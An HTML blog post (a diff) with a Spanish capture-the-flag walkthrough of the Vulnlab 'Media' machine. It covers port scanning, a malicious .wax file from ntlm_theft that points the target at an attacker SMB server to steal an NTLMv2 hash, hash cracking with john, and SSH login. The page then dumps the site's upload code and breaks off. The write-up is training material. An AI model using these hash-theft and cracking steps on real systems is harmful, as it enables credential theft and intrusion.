@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnlab - Media | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Vulnlab - Media" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/vulnlab/machines/2024/03/26/media.html" />
+<meta property="og:url" content="http://localhost:4000/vulnlab/machines/2024/03/26/media.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-26T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnlab - Media" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-26T00:00:00-06:00","datePublished":"2024-03-26T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Vulnlab - Media","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnlab/machines/2024/03/26/media.html"},"url":"http://localhost:4000/vulnlab/machines/2024/03/26/media.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnlab - Media</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-26T00:00:00-06:00" itemprop="datePublished">
+        Mar 26, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/vulnlab/img/machines/media/media.png" />
+</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong> de la máquina víctima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,3389 10.10.73.104 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-29 12:52 CST
+Nmap scan report <span class="k">for </span>10.10.73.104
+Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 0b:b3:c0:80:40:88:e1:ae:aa:3b:5f:f4:c2:23:c0:0d <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e0:80:3f:dd:b1:f8:fc:83:f5:de:d5:b3:2d:5a:4b:39 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b5:32:c0:72:18:10:0f:24:5d:f8:e1:ce:2a:73:5c:1f <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.1.17<span class="o">)</span>
+|_http-title: ProMotion Studio
+|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.1.17
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>MEDIA
+| Not valid before: 2023-10-09T13:41:32
+|_Not valid after:  2024-04-09T13:41:32
+| rdp-ntlm-info:
+|   Target_Name: MEDIA
+|   NetBIOS_Domain_Name: MEDIA
+|   NetBIOS_Computer_Name: MEDIA
+|   DNS_Domain_Name: MEDIA
+|   DNS_Computer_Name: MEDIA
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-02-29T18:53:02+00:00
+|_ssl-date: 2024-02-29T18:53:08+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h2 id="port-80-hash-ntlmv2">Port 80 hash NTLMv2</h2>
+
+<ul>
+  <li>Vemos que está corriendo un servicio web y vemos las tecnologías que se están empleando.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">73.104</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">73.104</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">56</span><span class="p">],</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">56</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">t</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">17</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">73.104</span><span class="p">],</span> <span class="no">OpenSSL</span><span class="p">[</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">t</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">17</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">ProMotion</span> <span class="no">Studio</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">17</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la página web.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/XOYElZE.png" />
+</p>
+
+<ul>
+  <li>Si bajamos observamos que tenemos algo interesante donde nos deja subir archivos.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/L6JoPu4.png" />
+</p>
+
+<ul>
+  <li>Bueno nos dice que por detrás debe de ser compatible con <strong>Windows Media Player</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/RJPzUju.png" />
+</p>
+
+<ul>
+  <li>Existe una herramienta que se llama <a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a> que lo que hace es generar varios archivos los cuales funcionan para robar el <strong>hash</strong> <strong>NTLMVv2</strong> (NT LAN Manager) en este caso usaremos solo los que son compatibles que nos dicen en la página <strong>web</strong> <a href="https://book.hacktricks.xyz/v/es/windows-hardening/ntlm">https://book.hacktricks.xyz/v/es/windows-hardening/ntlm</a> <a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a> cuando la persona que está por detras revise el <strong>.wax</strong> que voy a subir durante el proceso de autenticación se va a generar el hash y no va a llegar vamos a instalar la herramienta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap pip3 <span class="nb">install </span>xlsxwriter
+➜  nmap git clone https://github.com/Greenwolf/ntlm_theft
+</code></pre></div></div>
+
+<ul>
+  <li>Con esto ya estaría.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ntlm_theft git:<span class="o">(</span>master<span class="o">)</span> python3 ntlm_theft.py <span class="nt">-g</span> wax <span class="nt">-s</span> 10.8.1.127 <span class="nt">-f</span> stealhash
+Created: stealhash/stealhash.wax <span class="o">(</span>OPEN<span class="o">)</span>
+Generation Complete.
+➜  ntlm_theft git:<span class="o">(</span>master<span class="o">)</span> ✗
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí vemos el contenido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  stealhash git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat </span>stealhash.wax
+https://10.8.1.127/test
+file://<span class="se">\\</span>10.8.1.127/steal/file%                                                                                                                    ➜  stealhash git:<span class="o">(</span>master<span class="o">)</span> ✗
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que la <strong>url</strong> aputan a un archivo en nuestro sistema que se llama <strong>test</strong> no es necesario que exista y después con <strong>file</strong> le indica que es un enlace a un archivo en el sistema de archivos local o una red compartida para que esto funcione podemos usar <strong>responder</strong> o <strong>impacket-smbserver</strong> para que nos llegue el <strong>hash</strong> en mi caso estaré empleando <strong>impacket-smbserver</strong>, pero puede ser con cualquiera de los 2.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  stealhash git:<span class="o">(</span>master<span class="o">)</span> ✗ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a subir a la web él <strong>.wax</strong> que nos creó la herramienta.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/hRgbnnB.png" />
+</p>
+
+<ul>
+  <li>Una vez lo subimos vamos a esperar a que alguien por detrás lo revise para obtener su <strong>hash</strong> <strong>Ntlmv2</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/kkyMIjJ.png" />
+</p>
+
+<ul>
+  <li>Y bueno tenemos el <strong>hash</strong> del usuario <strong>enox</strong> vamos a crackearlo con <strong>john</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  stealhash git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat hash
+</span>enox::MEDIA:aaaaaaaaaaaaaaaa:7e3190c5c1f9db76bfc360f64ec94557:010100000000000000e4af7f456bda01121927e5fa2e588b0000000001001000430079006b006a00440078004100440003001000430079006b006a0044007800410044000200100064004100590064004d0074007a0065000400100064004100590064004d0074007a0065000700080000e4af7f456bda0106000400020000000800300030000000000000000000000000300000f56c0035a7b62431425b77bf8aa7260625be53589b34e8cddea5cc073973904c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la contraseña del usuario <strong>enox</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  stealhash git:<span class="o">(</span>master<span class="o">)</span> ✗ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="k">**********</span>       <span class="o">(</span>enox<span class="o">)</span>
+1g 0:00:00:42 DONE <span class="o">(</span>2024-02-29 13:32<span class="o">)</span> 0.02333g/s 311262p/s 311262c/s 311262C/s 1234ถ6789..1234mind
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<h2 id="shell-as-enox">Shell as enox</h2>
+
+<ul>
+  <li>Como el puerto <strong>22</strong> que corresponde a <strong>SSH</strong> está abierto, vamos a conectarnos con las credenciales que tenemos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ssh enox@10.10.73.104
+The authenticity of host <span class="s1">'10.10.73.104 (10.10.73.104)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.73.104<span class="s1">' (ED25519) to the list of known hosts.
+enox@10.10.73.104'</span>s password:
+Microsoft Windows <span class="o">[</span>Version 10.0.20348.1970]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+enox@MEDIA C:<span class="se">\U</span>sers<span class="se">\e</span>nox&gt;whoami
+media<span class="se">\e</span>nox
+
+enox@MEDIA C:<span class="se">\U</span>sers<span class="se">\e</span>nox&gt;
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Como siempre en el <strong>Desktop</strong> del usuario se encuentra su flag.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enox</span><span class="err">@</span><span class="nx">MEDIA</span><span class="w"> </span><span class="nx">C:\Users\enox\Desktop</span><span class="err">&gt;</span><span class="nx">dir</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">drive</span><span class="w"> </span><span class="nx">C</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">label.</span><span class="w">
+ </span><span class="n">Volume</span><span class="w"> </span><span class="nx">Serial</span><span class="w"> </span><span class="nx">Number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">EAD8-5D48</span><span class="w">
+
+ </span><span class="n">Directory</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">C:\Users\enox\Desktop</span><span class="w">
+
+</span><span class="mi">10</span><span class="n">/02/2023</span><span class="w">  </span><span class="nx">10:04</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="o">.</span><span class="w">
+</span><span class="mi">10</span><span class="n">/02/2023</span><span class="w">  </span><span class="nx">09:26</span><span class="w"> </span><span class="nx">AM</span><span class="w">    </span><span class="err">&lt;</span><span class="nx">DIR</span><span class="err">&gt;</span><span class="w">          </span><span class="o">..</span><span class="w">
+</span><span class="mi">10</span><span class="n">/10/2023</span><span class="w">  </span><span class="nx">02:58</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">36</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+               </span><span class="mi">1</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">             </span><span class="nx">36</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+               </span><span class="mi">2</span><span class="w"> </span><span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">   </span><span class="nx">8</span><span class="p">,</span><span class="nx">547</span><span class="p">,</span><span class="nx">569</span><span class="p">,</span><span class="nx">664</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">free</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>En este directorio tenemos los archivos de la página web a donde subimos él <strong>.wax</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enox@MEDIA C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
+
+10/02/2023  09:27 AM    &lt;DIR&gt;          <span class="nb">.</span>
+10/02/2023  10:03 AM    &lt;DIR&gt;          ..
+10/02/2023  09:27 AM    &lt;DIR&gt;          assets
+10/02/2023  09:27 AM    &lt;DIR&gt;          css
+10/10/2023  04:00 AM            20,563 index.php
+10/02/2023  09:27 AM    &lt;DIR&gt;          js
+               1 File<span class="o">(</span>s<span class="o">)</span>         20,563 bytes
+               5 Dir<span class="o">(</span>s<span class="o">)</span>   8,547,749,888 bytes free
+
+enox@MEDIA C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el codigo fuente:</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enox@MEDIA C:\xampp\htdocs&gt;type index.php
+<span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Your PHP code for handling form submission and file upload goes here.</span>
+    <span class="nv">$uploadDir</span> <span class="o">=</span> <span class="s1">'C:/Windows/Tasks/Uploads/'</span><span class="p">;</span> <span class="c1">// Base upload directory</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$firstname</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"firstname"</span><span class="p">],</span> <span class="no">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+        <span class="nv">$lastname</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"lastname"</span><span class="p">],</span> <span class="no">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+        <span class="nv">$email</span> <span class="o">=</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">],</span> <span class="no">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+
+        <span class="c1">// Create a folder name using the MD5 hash of Firstname + Lastname + Email</span>
+        <span class="nv">$folderName</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$firstname</span> <span class="mf">.</span> <span class="nv">$lastname</span> <span class="mf">.</span> <span class="nv">$email</span><span class="p">);</span>
+
+        <span class="c1">// Create the full upload directory path</span>
+        <span class="nv">$targetDir</span> <span class="o">=</span> <span class="nv">$uploadDir</span> <span class="mf">.</span> <span class="nv">$folderName</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">;</span>
+
+        <span class="c1">// Ensure the directory exists; create it if not</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$targetDir</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$targetDir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Sanitize the filename to remove unsafe characters</span>
+        <span class="nv">$originalFilename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
+        <span class="nv">$sanitizedFilename</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/[^a-zA-Z0-9._]/"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$originalFilename</span><span class="p">);</span>
+
+
+        <span class="c1">// Build the full path to the target file</span>
+        <span class="nv">$targetFile</span> <span class="o">=</span> <span class="nv">$targetDir</span> <span class="mf">.</span> <span class="nv">$sanitizedFilename</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"fileToUpload"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$targetFile</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');&lt;/script&gt;"</span><span class="p">;</span>
+
+            <span class="c1">// Update the todo.txt file</span>
+            <span class="nv">$todoFile</span> <span class="o">=</span> <span class="nv">$uploadDir</span> <span class="mf">.</span> <span class="s1">'todo.txt'</span><span class="p">;</span>
+            <span class="nv">$todoContent</span> <span class="o">=</span> <span class="s2">"Filename: "</span> <span class="mf">.</span> <span class="nv">$originalFilename</span> <span class="mf">.</span> <span class="s2">", Random Variable: "</span> <span class="mf">.</span> <span class="nv">$folderName</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+            <span class="c1">// Append the new line to the file</span>
+            <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$todoFile</span><span class="p">,</span> <span class="nv">$todoContent</span><span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Uh oh, something went wrong... Please submit again');&lt;/script&gt;"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="cp">?&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1, shrink-to-fit=no"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">""</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"author"</span> <span class="na">content=</span><span class="s">""</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;title&gt;</span>ProMotion Studio<span class="nt">&lt;/title&gt;</span>
+    <span class="c">&lt;!-- Favicon--&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">type=</span><span class="s">"image/x-icon"</span> <span class="na">href=</span><span class="s">"assets/favicon.ico"</span> <span class="nt">/&gt;</span>
+    <span class="c">&lt;!-- Font Awesome icons (free version)--&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://use.fontawesome.com/releases/v6.3.0/js/all.js"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="c">&lt;!-- Google fonts--&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://fonts.googleapis.com/css?family=Montserrat:400,700"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span>
+    <span class="c">&lt;!-- Core theme CSS (includes Bootstrap)--&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"css/styles.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">id=</span><span class="s">"page-top"</span><span class="nt">&gt;</span>
+    <span class="c">&lt;!-- Navigation--&gt;</span>
+    <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"navbar navbar-expand-lg navbar-dark fixed-top"</span> <span class="na">id=</span><span class="s">"mainNav"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"navbar-toggler"</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">data-bs-toggle=</span><span class="s">"collapse"</span> <span class="na">data-bs-target=</span><span class="s">"#navbarResponsive"</span>
+                <span class="na">aria-controls=</span><span class="s">"navbarResponsive"</span> <span class="na">aria-expanded=</span><span class="s">"false"</span> <span class="na">aria-label=</span><span class="s">"Toggle navigation"</span><span class="nt">&gt;</span>
+                Menu
+                <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-bars ms-1"</span><span class="nt">&gt;&lt;/i&gt;</span>
+            <span class="nt">&lt;/button&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"collapse navbar-collapse"</span> <span class="na">id=</span><span class="s">"navbarResponsive"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"navbar-nav text-uppercase ms-auto py-4 py-lg-0"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"nav-link"</span> <span class="na">href=</span><span class="s">"#services"</span><span class="nt">&gt;</span>Services<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"nav-link"</span> <span class="na">href=</span><span class="s">"#about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"nav-link"</span> <span class="na">href=</span><span class="s">"#team"</span><span class="nt">&gt;</span>Team<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"nav-link"</span> <span class="na">href=</span><span class="s">"#contact"</span><span class="nt">&gt;</span>Hiring<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+                <span class="nt">&lt;/ul&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/nav&gt;</span>
+    <span class="c">&lt;!-- Masthead--&gt;</span>
+    <span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"masthead"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"masthead-subheading"</span><span class="nt">&gt;</span>Welcome To Our Studio!<span class="nt">&lt;/div&gt;</span>
